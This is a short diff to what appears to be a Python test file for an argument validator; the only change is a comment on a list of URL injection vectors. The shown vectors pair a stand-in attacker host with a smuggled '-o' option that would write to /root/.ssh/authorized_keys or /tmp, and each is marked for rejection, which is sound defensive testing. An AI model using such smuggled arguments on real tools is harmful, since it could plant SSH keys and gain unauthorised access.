@@ -65,8 +65,9 @@ def _rejects(arg_def: ArgDef, value: str, *needles: str) -> str:
 # The url- vectors of the shared injection suite
 # ---------------------------------------------------------------------------
 
-# (id, arg fields, value, expectation). Mirrors tests/injection_vectors.json;
-# a later wave replaces this inline list with the file itself.
+# (id, arg fields, value, expectation). A local cross-check of the url-
+# vectors in tests/injection_vectors.json; the whole file is consumed by
+# test_injection_vectors.py.
 _URL_VECTORS = [
     ("url-space-option-injection", {}, "https://attacker.example/ -o /root/.ssh/authorized_keys", "reject"),
     ("url-space-write-tmp", {}, "https://attacker.example/ -o /tmp/pwned", "reject"),
